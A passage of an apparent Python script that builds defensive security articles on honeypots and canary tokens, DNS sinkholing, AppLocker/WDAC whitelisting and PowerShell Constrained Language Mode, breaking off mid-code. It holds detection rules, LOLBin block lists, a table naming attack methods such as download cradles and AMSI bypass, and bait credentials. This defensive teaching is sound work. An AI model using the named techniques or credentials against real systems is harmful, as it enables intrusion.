Deception technology creates traps and decoys that have no legitimate business purpose. Any interaction with a honeypot is, by definition, suspicious or malicious. This gives deception an extremely low false-positive rate compared to traditional detection methods. Honeypots detect attackers who have already bypassed perimeter defenses and are moving laterally through the network, a critical detection gap in many environments.

**Detection comparison:**

| Detection Method | False Positive Rate | Detects Internal Threats | Setup Complexity |
|---|---|---|---|
| Firewall logs | High | Limited | Low |
| IDS/IPS signatures | Medium | Limited | Medium |
| EDR behavioral | Medium | Yes | Medium |
| Honeypots/Canaries | Very Low | Yes | Low |

**What deception catches:**

- Lateral movement (port scanning, service enumeration)
- Credential harvesting (fake credentials in documents)
- Data exfiltration (canary documents opened outside network)
- Insider threats (accessing files/shares they should not)
- Automated malware (worm propagation, ransomware encryption)

## Deception Components

| Component | Purpose | Example |
|---|---|---|
| Honey services | Fake services that alert on connection | SSH, SMB, HTTP, RDP |
| Honey credentials | Fake creds that alert on use | AD accounts, AWS keys |
| Honey files | Documents that alert when opened | Word docs, PDFs with tokens |
| Honey DNS entries | Fake DNS records that alert on resolution | Unused A records |
| Honey shares | Fake network shares with canary files | SMB shares with tempting names |

## Implementation: CanaryTokens

CanaryTokens are lightweight tripwires that alert when triggered.

### Step 1: Self-Hosted CanaryTokens Server

```bash
# Clone and deploy canarytokens
git clone https://github.com/thinkst/canarytokens-docker.git
cd canarytokens-docker

# Configure settings
cp switchboard.env.dist switchboard.env
```

```ini
# switchboard.env
CANARY_DOMAIN=canary.yourdomain.com
CANARY_PUBLIC_IP=203.0.113.50
CANARY_ALERT_EMAIL_ADDRESS=soc-alerts@contoso.com
CANARY_ALERT_EMAIL_FROM_ADDRESS=canary@contoso.com
CANARY_ALERT_EMAIL_SUBJECT=[CANARY ALERT]
CANARY_SMTP_SERVER=smtp.contoso.com
CANARY_SMTP_PORT=587
CANARY_SMTP_USERNAME=canary-alerts
CANARY_SMTP_PASSWORD=your-smtp-password
```

```bash
# Deploy with Docker Compose
docker-compose up -d

# Access web UI at http://canary.yourdomain.com
```

### Step 2: Deploy CanaryTokens Across the Environment

**DNS token (alerts when resolved):**

```bash
# Create DNS canarytoken via API
curl -X POST https://canary.yourdomain.com/generate \
  -d "type=dns&email=soc@contoso.com&memo=DC01-DNS-Token"

# Returns: abc123.canary.yourdomain.com
# Place in: DNS CNAME records, config files, scripts
```

**AWS Keys token (alerts when used):**

```bash
# Generate fake AWS credentials
curl -X POST https://canary.yourdomain.com/generate \
  -d "type=aws-id&email=soc@contoso.com&memo=Fake-AWS-Key-ServerRoom"

# Returns:
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Place in:
# - .aws/credentials file on honey systems
# - Environment variables in Docker configs
# - Comments in source code repos
```

**Word document token:**

```bash
# Generate Word doc that phones home when opened
curl -X POST https://canary.yourdomain.com/generate \
  -d "type=doc-msword&email=soc@contoso.com&memo=Finance-Server-Passwords"

# Download the generated .docx file
# Name it something tempting: "Network-Passwords-2026.docx"
# Place on file shares, desktops, SharePoint
```

**Placement strategy:**

| Token Type | Placement Location | Naming Convention |
|---|---|---|
| Word docs | File shares, desktops | Passwords.docx, VPN-Credentials.docx |
| AWS keys | .aws directories, env files | Production keys in config |
| DNS tokens | Hosts files, DNS records | Unused internal names |
| Web bugs | Internal wiki pages | Images on sensitive pages |
| SQL tokens | Database tables | Fake admin credential rows |

### Step 3: Deploy OpenCanary Honeypot

```bash
# Install OpenCanary
pip install opencanary

# Generate default config
opencanaryd --copyconfig

# Edit configuration
vim /etc/opencanaryd/opencanary.conf
```

**OpenCanary configuration:**

```json
{
    "device.node_id": "honeypot-dc-backup",
    "server.ip": "0.0.0.0",
    "server.port": 5000,

    "logger": {
        "class": "PyLogger",
        "kwargs": {
            "formatters": {
                "plain": {
                    "format": "%(message)s"
                }
            },
            "handlers": {
                "file": {
                    "class": "logging.FileHandler",
                    "filename": "/var/log/opencanary/alerts.json"
                },
                "syslog": {
                    "class": "logging.handlers.SysLogHandler",
                    "address": ["siem.contoso.com", 514]
                }
            }
        }
    },

    "ftp.enabled": true,
    "ftp.port": 21,
    "ftp.banner": "FTP server ready",

    "ssh.enabled": true,
    "ssh.port": 22,
    "ssh.version": "SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3",

    "http.enabled": true,
    "http.port": 80,
    "http.banner": "Apache/2.4.29 (Ubuntu)",
    "http.skin": "nasLogin",

    "smb.enabled": true,
    "smb.port": 445,
    "smb.auditfile": "/var/log/opencanary/smb-audit.log",
    "smb.filelist": [
        {"name": "2026-Salaries.xlsx", "type": "xlsx"},
        {"name": "IT-Network-Map.pdf", "type": "pdf"},
        {"name": "admin-passwords.txt", "type": "txt"}
    ],

    "rdp.enabled": true,
    "rdp.port": 3389,

    "mssql.enabled": true,
    "mssql.port": 1433,
    "mssql.version": "2019",

    "telnet.enabled": true,
    "telnet.port": 23,
    "telnet.banner": "Login:",

    "snmp.enabled": true,
    "snmp.port": 161
}
```

```bash
# Start OpenCanary
opencanaryd --start

# Verify services are listening
ss -tlnp | grep -E "(21|22|80|445|3389|1433|23|161)"
```

### Step 4: Active Directory Honey Accounts

```powershell
# Create honey user accounts that trigger alerts when used
New-ADUser -Name "svc_backup_admin" `
    -SamAccountName "svc_backup_admin" `
    -Description "Backup service - DO NOT DELETE" `
    -AccountPassword (ConvertTo-SecureString "Honey!Password123" -AsPlainText -Force) `
    -Enabled $true `
    -CannotChangePassword $true `
    -PasswordNeverExpires $true

# Set SPN for Kerberoasting detection
Set-ADUser "svc_backup_admin" -ServicePrincipalNames @{Add="MSSQLSvc/backup-sql.contoso.com:1433"}

# Create honey admin group
New-ADGroup -Name "Emergency-Domain-Admins" -GroupScope Global

# Monitor Event ID 4768 (TGT request) for this account
# Any authentication attempt = attacker using harvested credentials
```

## Verification Commands

```bash
# Test canary services are responding
nmap -sV -p 21,22,80,445,3389,1433,23 honeypot-ip

# Verify OpenCanary is logging
tail -f /var/log/opencanary/alerts.json | python -m json.tool

# Test a canary token
nslookup abc123.canary.yourdomain.com
# Should trigger email/webhook alert within seconds
```

```powershell
# Verify honey AD account exists and has SPN
Get-ADUser "svc_backup_admin" -Properties ServicePrincipalName |
    Select-Object Name, ServicePrincipalName

# Check for any auth attempts against honey account
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4768} |
    Where-Object { $_.Properties[0].Value -eq "svc_backup_admin" }
```

## Monitoring for Bypass

| Bypass Attempt | Detection |
|---|---|
| Attacker identifies honeypot via fingerprinting | Use realistic banners, real OS on honey systems |
| Canary token blocked by proxy | Use DNS tokens (harder to block) |
| Attacker avoids obvious honey files | Distribute widely, use subtle names |
| Network scanning avoids known honey IPs | Randomize placement, use real-looking hostnames |

## MITRE ATT&CK References

| Technique | ID | Detection via Deception |
|---|---|---|
| Network Service Discovery | T1046 | Port scan hits honey services |
| Account Discovery | T1087 | Enumeration finds honey accounts |
| Kerberoasting | T1558.003 | SPN on honey account triggers alert |
| Data from Network Shared Drive | T1039 | Honey files accessed on shares |
| Valid Accounts | T1078 | Honey credential usage detected |
| Brute Force | T1110 | Login attempts to honey SSH/RDP |

## Rollout Checklist

- [ ] Deploy self-hosted CanaryTokens server
- [ ] Create and place DNS, document, and credential tokens
- [ ] Deploy OpenCanary on 2-3 systems per network segment
- [ ] Create honey AD accounts with SPNs
- [ ] Create honey file shares with tempting names
- [ ] Configure alerting pipeline to SIEM and SOC
- [ ] Document all honey assets (avoid self-alerting)
- [ ] Test each token and honey service end-to-end
- [ ] Brief SOC team on honeypot alert handling procedures
- [ ] Quarterly review and refresh of deception assets
"""
    ))

    # -------------------------------------------------------------------------
    # Article 9: DNS Sinkholing and Passive DNS Monitoring
    # -------------------------------------------------------------------------
    articles.append((
        "DNS Sinkholing and Passive DNS Monitoring",
        ["dns", "sinkhole", "passive-dns", "detection", "defense", "network", "c2"],
        r"""# DNS Sinkholing and Passive DNS Monitoring

## Why This Matters

DNS is a critical control point for security because nearly all network communication begins with a DNS query. Malware must resolve C2 domains, phishing sites need DNS resolution, and data exfiltration often uses DNS tunneling. **DNS sinkholing** redirects queries for known-malicious domains to a controlled IP, blocking C2 communication. **Passive DNS monitoring** records all DNS queries for retrospective threat hunting, enabling detection of domain generation algorithms (DGAs), fast-flux networks, and DNS tunneling.

**Why DNS is the ideal detection layer:**

| Advantage | Explanation |
|---|---|
| Universal coverage | Every device uses DNS, even IoT/OT without agents |
| Pre-connection visibility | DNS query happens before malicious connection is made |
| Encryption blind spot bypass | DNS query reveals intent even when payload is encrypted |
| Historical analysis | Passive DNS enables retrospective hunting |
| Low overhead | Logging DNS adds minimal infrastructure cost |

## Implementation Steps

### Step 1: Internal DNS Sinkhole Configuration

**Windows DNS Server sinkhole zone:**

```powershell
# Create a sinkhole zone for a known malicious domain
Add-DnsServerPrimaryZone -Name "malicious-c2-domain.com" `
    -ZoneFile "malicious-c2-domain.com.dns" `
    -DynamicUpdate None

# Point all queries for that domain to sinkhole IP
Add-DnsServerResourceRecordA -ZoneName "malicious-c2-domain.com" `
    -Name "@" -IPv4Address "10.99.99.1"
Add-DnsServerResourceRecordA -ZoneName "malicious-c2-domain.com" `
    -Name "*" -IPv4Address "10.99.99.1"
```

**Automated sinkhole from threat feeds:**

```powershell
# Script to bulk-import malicious domains as sinkhole zones
# Run daily via scheduled task

$sinkholeIP = "10.99.99.1"
$feedUrl = "https://urlhaus.abuse.ch/downloads/hostfile/"

# Download and parse threat feed
$domains = (Invoke-WebRequest -Uri $feedUrl -UseBasicParsing).Content -split "`n" |
    Where-Object { $_ -match "^[0-9]" } |
    ForEach-Object { ($_ -split "\s+")[1] } |
    Where-Object { $_ -and $_ -ne "localhost" } |
    Select-Object -Unique

foreach ($domain in $domains) {
    try {
        # Check if zone already exists
        $existing = Get-DnsServerZone -Name $domain -ErrorAction SilentlyContinue
        if (-not $existing) {
            Add-DnsServerPrimaryZone -Name $domain -ZoneFile "$domain.dns" -DynamicUpdate None
            Add-DnsServerResourceRecordA -ZoneName $domain -Name "@" -IPv4Address $sinkholeIP
            Add-DnsServerResourceRecordA -ZoneName $domain -Name "*" -IPv4Address $sinkholeIP
            Write-Host "Sinkholed: $domain"
        }
    } catch {
        Write-Warning "Failed to sinkhole $domain : $_"
    }
}
```

**BIND9 RPZ (Response Policy Zone) for Linux DNS:**

```bash
# /etc/bind/named.conf.options - add response-policy { zone "rpz.local"; };
# /etc/bind/named.conf.local - define rpz.local as master zone

# /etc/bind/db.rpz.local entries:
# CNAME . = NXDOMAIN, A record = redirect to sinkhole
# malicious-c2.com       CNAME .
# *.malicious-c2.com     CNAME .
# evil-phishing.com      A 10.99.99.1
# *.evil-phishing.com    A 10.99.99.1
```

### Step 2: Sinkhole Web Server

Deploy a lightweight HTTP server on the sinkhole IP (10.99.99.1) to log requests from infected hosts. For each GET/POST, log: timestamp, client IP, Host header, path, User-Agent, and body preview. Write JSON entries to `/var/log/sinkhole/http.json` for SIEM ingestion. Use Python's `http.server` module or nginx with access logging. Any host connecting to the sinkhole is potentially infected and should trigger an alert.

### Step 3: Passive DNS Collection

**Using Zeek for passive DNS logging:**

```bash
# Zeek automatically logs all DNS queries to dns.log
# Ensure Zeek is configured on your network sensor

# /opt/zeek/share/zeek/site/local.zeek
@load base/protocols/dns
@load policy/protocols/dns/detect-external-names

# DNS log fields include:
# ts, uid, id.orig_h, id.resp_h, query, qtype, rcode, answers, TTLs
```

**Windows DNS Debug Logging:**

```powershell
# Enable DNS analytical logging on Windows DNS Server
Set-DnsServerDiagnostics -All $true
Set-DnsServerDiagnostics -EnableLoggingForLocalLookupEvent $true
Set-DnsServerDiagnostics -EnableLoggingForPluginDllEvent $true
Set-DnsServerDiagnostics -EnableLoggingForRecursiveLookupEvent $true

# Or enable DNS query logging via Event Log
wevtutil sl "Microsoft-Windows-DNS-Server/Analytical" /e:true

# For DNS Client logging on endpoints
wevtutil sl "Microsoft-Windows-DNS-Client/Operational" /e:true
```

**Collect with Filebeat for SIEM:**

```yaml
# filebeat.yml - DNS log collection
filebeat.inputs:
  - type: log
    paths:
      - /opt/zeek/logs/current/dns.log
    json.keys_under_root: true
    fields:
      type: zeek_dns

  - type: log
    paths:
      - /var/log/sinkhole/http.json
    json.keys_under_root: true
    fields:
      type: sinkhole_hit
```

### Step 4: DNS Anomaly Detection Rules

**Detect DNS tunneling (long queries):**

```kql
ZeekDNS
| where strlen(query) > 50
| extend labels = countof(query, ".")
| where labels > 5
| summarize QueryCount=count(), AvgLength=avg(strlen(query))
    by id_orig_h, query_domain=extract("([^.]+\\.[^.]+)$", 1, query), bin(TimeGenerated, 1h)
| where QueryCount > 100 and AvgLength > 40
```

**Detect DGA domains (high entropy):**

```python
# DGA detection based on character entropy
import math
from collections import Counter

def domain_entropy(domain):
    # Calculate Shannon entropy of domain name.
    label = domain.split('.')[0]
    if len(label) < 3:
        return 0
    freq = Counter(label)
    length = len(label)
    entropy = -sum((c/length) * math.log2(c/length) for c in freq.values())
    return entropy

# DGA domains typically have entropy > 3.5
# Legitimate domains usually < 3.0
# Examples:
# "google"     -> entropy ~2.25 (normal)
# "xk8mq2pv9z" -> entropy ~3.32 (suspicious)
# "asdfjklqwer" -> entropy ~3.58 (likely DGA)
```

**Detect sinkhole hits (infected hosts):**

```kql
SinkholeHTTPLog
| where client_ip != "10.99.99.1"
| summarize HitCount=count(), Domains=make_set(host) by client_ip, bin(TimeGenerated, 1h)
| where HitCount > 5
| project TimeGenerated, InfectedHost=client_ip, HitCount, C2Domains=Domains
```

## Verification Commands

```powershell
# Verify sinkhole zone exists
Get-DnsServerZone | Where-Object { $_.ZoneName -eq "malicious-c2-domain.com" }

# Test sinkhole resolution
Resolve-DnsName "malicious-c2-domain.com" -Server 10.1.1.53
# Should return 10.99.99.1

# Count active sinkhole zones
(Get-DnsServerZone | Where-Object { $_.ZoneType -eq "Primary" -and $_.IsAutoCreated -eq $false }).Count
```

```bash
# Verify RPZ is loaded (BIND)
rndc zonestatus rpz.local

# Test sinkhole
dig @localhost malicious-c2.com
# Should return sinkhole IP or NXDOMAIN

# Check passive DNS log volume
wc -l /opt/zeek/logs/current/dns.log
```

## Monitoring for Bypass

| Bypass Technique | Detection |
|---|---|
| Direct IP C2 (no DNS) | Monitor for connections to IPs with no prior DNS query |
| DNS over HTTPS (DoH) | Block known DoH providers; monitor TLS to port 443 on DNS IPs |
| DNS over TLS (DoT) | Monitor/block port 853 to external IPs |
| Hardcoded public DNS (8.8.8.8) | Firewall rule: block outbound UDP/TCP 53 except to internal DNS |
| Domain fronting | TLS SNI vs HTTP Host header mismatch detection |

**Firewall rule to force internal DNS:**

```
# Block all outbound DNS except to internal resolvers
deny any -> !10.1.1.53,10.1.1.54 tcp/53
deny any -> !10.1.1.53,10.1.1.54 udp/53
deny any -> any tcp/853   # Block DNS over TLS
```

## MITRE ATT&CK References

| Technique | ID | Detection/Mitigation |
|---|---|---|
| Application Layer Protocol: DNS | T1071.004 | Passive DNS + tunneling detection |
| Dynamic Resolution: DGA | T1568.002 | Entropy analysis on queries |
| Exfiltration Over Alternative Protocol | T1048 | DNS query length/volume monitoring |
| Command and Scripting Interpreter | T1059 | Sinkhole blocks C2 callback |
| Domain Generation Algorithms | T1568.002 | DGA detection + RPZ blocking |
| Encrypted Channel: Asymmetric | T1573.002 | DoH/DoT blocking |

## Rollout Checklist

- [ ] Configure internal DNS sinkhole zones for known malicious domains
- [ ] Subscribe to threat intel feeds for automated sinkhole updates
- [ ] Deploy sinkhole web server to identify infected hosts
- [ ] Enable passive DNS logging (Zeek or Windows DNS debug logs)
- [ ] Forward DNS logs to SIEM
- [ ] Create detection rules for tunneling, DGA, and anomalies
- [ ] Block outbound DNS to non-approved resolvers
- [ ] Block DNS over HTTPS and DNS over TLS to external servers
- [ ] Create dashboard for sinkhole hits and DNS anomalies
- [ ] Run weekly report on top queried domains and new domains
"""
    ))

    # -------------------------------------------------------------------------
    # Article 10: Application Whitelisting with AppLocker and WDAC
    # -------------------------------------------------------------------------
    articles.append((
        "Application Whitelisting with AppLocker and WDAC",
        ["hardening", "applocker", "wdac", "whitelisting", "windows", "defense", "endpoint"],
        r"""# Application Whitelisting with AppLocker and WDAC

## Why This Matters

Application whitelisting is the single most effective control against unauthorized code execution. Instead of trying to identify and block every known malicious file (a losing game with 400,000+ new malware samples daily), whitelisting only allows known-good applications to run. MITRE and the Australian Signals Directorate both rank application whitelisting as the number one mitigation strategy. Windows provides two built-in technologies: **AppLocker** (easier to manage) and **Windows Defender Application Control (WDAC)** (stronger enforcement).

**Comparison:**

| Feature | AppLocker | WDAC |
|---|---|---|
| Enforcement level | User-mode only | Kernel + user-mode |
| Bypass resistance | Moderate (bypassable via DLL) | High (kernel-enforced) |
| Management | GPO, simple rules | CI policies, more complex |
| OS requirement | Enterprise/Education | All Windows 10/11 editions |
| Managed installer | No | Yes (integrates with SCCM/Intune) |
| Tamper resistance | Service can be stopped by admin | Cannot be disabled without reboot |

## Implementation: AppLocker

### Step 1: Establish Application Baseline

```powershell
# Generate default AppLocker rules as starting point
Get-AppLockerPolicy -Effective -Xml | Out-File C:\AppLockerBaseline.xml

# Scan a reference workstation to discover installed apps
Get-AppLockerFileInformation -Directory "C:\Program Files" -Recurse -FileType Exe |
    Select-Object Path, Publisher, Hash | Export-Csv C:\AppInventory.csv

Get-AppLockerFileInformation -Directory "C:\Program Files (x86)" -Recurse -FileType Exe |
    Select-Object Path, Publisher, Hash | Export-Csv C:\AppInventory_x86.csv -Append
```

### Step 2: Configure AppLocker Rules via GPO

```
Computer Configuration > Policies > Windows Settings > Security Settings >
  Application Control Policies > AppLocker

Executable Rules:
  Default Rules (auto-generate):
  - Allow Everyone: All files in %SYSTEMROOT%\*
  - Allow Everyone: All files in %PROGRAMFILES%\*
  - Allow BUILTIN\Administrators: All files

  Custom Rules:
  - Allow Everyone: Publisher = Microsoft Corporation (signed)
  - Allow Everyone: Publisher = Google LLC (for Chrome)
  - Deny Everyone: Path = %USERPROFILE%\*\*.exe
  - Deny Everyone: Path = %TEMP%\*\*.exe
  - Deny Everyone: Path = %APPDATA%\*\*.exe

Script Rules:
  - Allow Everyone: All scripts in %SYSTEMROOT%\*
  - Allow BUILTIN\Administrators: All scripts
  - Deny Everyone: Path = %USERPROFILE%\*\*.ps1
  - Deny Everyone: Path = %USERPROFILE%\*\*.vbs
  - Deny Everyone: Path = %USERPROFILE%\*\*.js
  - Deny Everyone: Path = %USERPROFILE%\*\*.bat

DLL Rules (optional, performance impact):
  - Allow Everyone: All DLLs in %SYSTEMROOT%\*
  - Allow Everyone: All DLLs in %PROGRAMFILES%\*

Packaged App Rules:
  - Allow Everyone: All signed packaged apps
```

### Step 3: Enable in Audit Mode First

```powershell
# Set AppLocker to Audit mode (log but don't block)
# GPO: AppLocker > Properties > Configured (check all rule types)
#   Enforcement mode: Audit only

# Start the Application Identity service (required)
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service -Name AppIDSvc
```

### Step 4: Monitor Audit Events

```powershell
# Check AppLocker audit events
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 100 |
    Where-Object { $_.Id -in @(8003, 8004) } |
    Select-Object TimeCreated, Id, Message

# Event IDs:
# 8001 = Policy applied
# 8002 = Exe/DLL allowed
# 8003 = Exe/DLL would have been blocked (Audit)
# 8004 = Exe/DLL blocked (Enforce)
```

**SIEM query for AppLocker events:**

```kql
Event
| where Source == "Microsoft-Windows-AppLocker"
| where EventID in (8003, 8004)
| parse Message with * "was " Action " from running" *
| parse Message with * "File: " FilePath " was" *
| summarize BlockCount=count() by FilePath, Action, Computer
| sort by BlockCount desc
```

### Step 5: Switch to Enforce Mode

After 2-4 weeks with no critical business impact in audit:

```powershell
# GPO: AppLocker > Properties > Enforcement
#   Executable rules: Enforce rules
#   Script rules: Enforce rules
#   Windows Installer rules: Enforce rules
#   Packaged app rules: Enforce rules
```

## Implementation: WDAC (Windows Defender Application Control)

### Step 1: Create Base Policy

```powershell
# Create WDAC policy from reference machine scan
New-CIPolicy -Level Publisher -FilePath "C:\WDAC\BasePolicy.xml" `
    -UserPEs -Fallback Hash

# Add Microsoft-signed binaries
Add-SignerRule -FilePath "C:\WDAC\BasePolicy.xml" `
    -CertificatePath "C:\Windows\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\Microsoft-Windows-Client-Desktop-Required-Package~31bf3856ad364e35~amd64~~10.0.22621.1.cat" `
    -Kernel -User

# Merge with Microsoft recommended block rules
$blockRules = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MicrosoftDocs/windows-itpro-docs/public/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac.md"
```

### Step 2: Enable Managed Installer (SCCM/Intune)

```powershell
# Allow SCCM-deployed applications automatically
# This rule trusts the SCCM client as a managed installer
$managedInstaller = @"
<SiPolicy xmlns="urn:schemas-microsoft-com:sipolicy">
  <Rules>
    <Rule>
      <Option>Enabled:Managed Installer</Option>
    </Rule>
  </Rules>
</SiPolicy>
"@
```

### Step 3: Deploy in Audit Mode

```powershell
# Set policy to audit mode
Set-RuleOption -FilePath "C:\WDAC\BasePolicy.xml" -Option 3  # Audit mode

# Convert to binary
ConvertFrom-CIPolicy -XmlFilePath "C:\WDAC\BasePolicy.xml" `
    -BinaryFilePath "C:\WDAC\BasePolicy.p7b"

# Deploy via GPO
# Computer Configuration > Administrative Templates > System > Device Guard
#   Deploy Windows Defender Application Control = Enabled
#   Policy file path: \\contoso.com\NETLOGON\WDAC\BasePolicy.p7b
```

### Step 4: WDAC Supplemental Policies (Windows 10 1903+)

```powershell
# Create supplemental policy for line-of-business apps
New-CIPolicy -Level Publisher -FilePath "C:\WDAC\LOBApps.xml" `
    -ScanPath "C:\Program Files\LOBApp\" -UserPEs -Fallback Hash

# Mark as supplemental
Set-CIPolicyIdInfo -FilePath "C:\WDAC\LOBApps.xml" `
    -BasePolicyToSupplementPath "C:\WDAC\BasePolicy.xml"

# Convert and deploy alongside base policy
ConvertFrom-CIPolicy -XmlFilePath "C:\WDAC\LOBApps.xml" `
    -BinaryFilePath "C:\WDAC\LOBApps.p7b"
```

## Verification Commands

```powershell
# === AppLocker Verification ===
# Check AppLocker policy is applied
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Check Application Identity service
Get-Service AppIDSvc | Select-Object Status, StartType

# Test: attempt to run exe from user temp (should be blocked)
# Copy notepad.exe to %TEMP% and try to run it

# === WDAC Verification ===
# Check WDAC policy status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object CodeIntegrityPolicyEnforcementStatus

# List active WDAC policies
citool --list-policies

# Check Code Integrity event log
Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" -MaxEvents 20
```

## Monitoring for Bypass

**Known bypass techniques to watch:**

| Bypass | Mitigation |
|---|---|
| Living-off-the-land binaries (LOLBins) | Block known LOLBins (mshta, wscript, cscript, regsvr32) |
| DLL side-loading | Enable DLL rules in AppLocker; use WDAC for kernel protection |
| PowerShell bypass | Constrained Language Mode + script rules |
| Managed installer abuse | Restrict managed installer to specific paths |
| Alternate data streams | Include ADS in scanning rules |

**Detection queries:**

```kql
DeviceEvents
| where ActionType in ("AppControlExecutionBlocked", "AppControlExecutionAudited")
| summarize BlockCount=count() by FileName, FolderPath, SHA256
| sort by BlockCount desc
| where BlockCount > 3
```

## MITRE ATT&CK References

| Technique | ID | Mitigation |
|---|---|---|
| User Execution: Malicious File | T1204.002 | Blocks unauthorized executables |
| Command and Scripting Interpreter | T1059 | Script rules block unauthorized scripts |
| Signed Binary Proxy Execution | T1218 | LOLBin blocking rules |
| DLL Side-Loading | T1574.002 | WDAC DLL enforcement |
| Software Deployment Tools | T1072 | Managed installer controls |

## Rollout Checklist

- [ ] Inventory all applications on reference workstations
- [ ] Choose AppLocker (easier) or WDAC (stronger) based on requirements
- [ ] Create baseline allow rules (publisher + path)
- [ ] Deploy in Audit mode for 4-6 weeks
- [ ] Analyze audit logs for false positives
- [ ] Create exceptions for legitimate applications
- [ ] Switch to Enforce mode for pilot group
- [ ] Expand enforcement to all workstations
- [ ] Monitor for bypass attempts and blocked legitimate apps
- [ ] Quarterly policy review and application inventory update
"""
    ))

    # -------------------------------------------------------------------------
    # Article 11: PowerShell Constrained Language Mode and JEA
    # -------------------------------------------------------------------------
    articles.append((
        "PowerShell Constrained Language Mode and JEA",
        ["powershell", "hardening", "jea", "defense", "windows", "clm", "endpoint"],
        r"""# PowerShell Constrained Language Mode and JEA

## Why This Matters

PowerShell is the most abused living-off-the-land tool in modern attacks. It provides direct access to .NET Framework, Windows APIs, and system management capabilities that attackers exploit for reconnaissance, lateral movement, credential theft, and payload execution. **Constrained Language Mode (CLM)** restricts PowerShell to a safe subset that blocks access to dangerous .NET types and COM objects. **Just Enough Administration (JEA)** limits what commands administrators can run in remote PowerShell sessions, enforcing least privilege for admin tasks.

**Attack techniques that abuse PowerShell:**

| Technique | PowerShell Method | CLM Blocks It |
|---|---|---|
| Download cradle | `Invoke-WebRequest`, `Net.WebClient` | Yes (.NET type blocked) |
| Reflective PE injection | `[System.Reflection.Assembly]::Load()` | Yes (.NET type blocked) |
| AMSI bypass | Reflection to modify AmsiUtils | Yes (reflection blocked) |
| WMI lateral movement | `Invoke-WmiMethod` | Restricted in CLM |
| Mimikatz execution | `Invoke-Expression` with encoded payload | Yes (script block blocked) |
| Registry manipulation | Direct .NET Registry classes | Yes (.NET type blocked) |

## Implementation: Constrained Language Mode

### Step 1: Understand Language Modes

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Possible values:
# FullLanguage       - No restrictions (default)
# ConstrainedLanguage - Blocks .NET, COM, type definitions
# RestrictedLanguage  - Variables only, no cmdlets
# NoLanguage          - No scripts at all
```

**What Constrained Language Mode blocks:**

| Blocked Feature | Example |
|---|---|
| .NET type creation | `[System.Net.WebClient]::new()` |
| COM object creation | `New-Object -ComObject WScript.Shell` |
| Type definitions | `Add-Type -TypeDefinition $code` |
| Module import (unsigned) | `Import-Module .\evil.psm1` |
| Script blocks as types | `[scriptblock]::Create($code)` |

**What still works in CLM:**

| Allowed Feature | Example |
|---|---|
| Core cmdlets | `Get-Process`, `Get-Service` |
| Basic operators | `if`, `foreach`, `while` |
| String manipulation | `$s.Replace()`, `$s.Split()` |
| Signed scripts/modules | Scripts signed with trusted cert |
| Built-in modules | ActiveDirectory, GroupPolicy |

### Step 2: Enable CLM via WDAC (Recommended Method)

CLM is most effective when enforced through WDAC, which prevents bypass:

```powershell
# When WDAC is in Enforce mode, PowerShell automatically enters
# Constrained Language Mode for any script not covered by the policy

# Verify: on a WDAC-enforced machine, run:
$ExecutionContext.SessionState.LanguageMode
# Should return: ConstrainedLanguage

# Admin scripts signed with an allowed certificate run in FullLanguage
# Unsigned or untrusted scripts run in ConstrainedLanguage
```

### Step 3: Enable CLM via Environment Variable (Testing Only)

```powershell
# WARNING: This method is bypassable and only for testing
# Set system environment variable
[Environment]::SetEnvironmentVariable("__PSLockdownPolicy", "4", "Machine")

# After reboot, all new PowerShell sessions will be in CLM
# Value 4 = ConstrainedLanguage for all users
```

### Step 4: PowerShell Logging (Essential Companion)

```
# GPO: Computer Configuration > Administrative Templates >
#   Windows Components > Windows PowerShell

# Enable Module Logging
Turn on Module Logging = Enabled
Module Names: *

# Enable Script Block Logging
Turn on PowerShell Script Block Logging = Enabled
Log script block invocation start/stop events = Enabled

# Enable Transcription Logging
Turn on PowerShell Transcription = Enabled
Transcript output directory: \\server\PSTranscripts$\
Include invocation headers = Enabled
```

```powershell
# Verify logging is active
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
```

## Implementation: Just Enough Administration (JEA)

### Step 1: Define Role Capabilities

```powershell
# Create JEA module directory
$modulePath = "C:\Program Files\WindowsPowerShell\Modules\JEA_SOCOperations"
New-Item -Path "$modulePath\RoleCapabilities" -ItemType Directory -Force

# Create role capability file for SOC analysts
New-PSRoleCapabilityFile -Path "$modulePath\RoleCapabilities\SOCAnalyst.psrc" `
    -Description "SOC Analyst - read-only investigation commands" `
    -VisibleCmdlets @(
        "Get-Process",
        "Get-Service",
        "Get-EventLog",
        "Get-WinEvent",
        "Get-NetTCPConnection",
        "Get-NetUDPEndpoint",
        "Get-ScheduledTask",
        "Get-LocalUser",
        "Get-LocalGroupMember",
        "Test-NetConnection",
        "Resolve-DnsName"
    ) `
    -VisibleFunctions @(
        "Get-IpInfo",
        "Get-SuspiciousProcesses"
    ) `
    -VisibleExternalCommands @(
        "C:\Windows\System32\ipconfig.exe",
        "C:\Windows\System32\netstat.exe",
        "C:\Windows\System32\tasklist.exe"
    ) `
    -FunctionDefinitions @{
        Name = "Get-SuspiciousProcesses"
        ScriptBlock = {
            Get-Process | Where-Object {
                $_.Path -and $_.Path -notmatch "^C:\\(Windows|Program Files)"
            } | Select-Object Name, Id, Path, StartTime
        }
    }
```

### Step 2: Create Session Configuration

```powershell
# Create session configuration file
New-PSSessionConfigurationFile -Path "$modulePath\SOCEndpoint.pssc" `
    -SessionType RestrictedRemoteServer `
    -RunAsVirtualAccount `
    -RoleDefinitions @{
        "CONTOSO\SOC-Analysts" = @{
            RoleCapabilities = "SOCAnalyst"
        }
        "CONTOSO\SOC-Leads" = @{
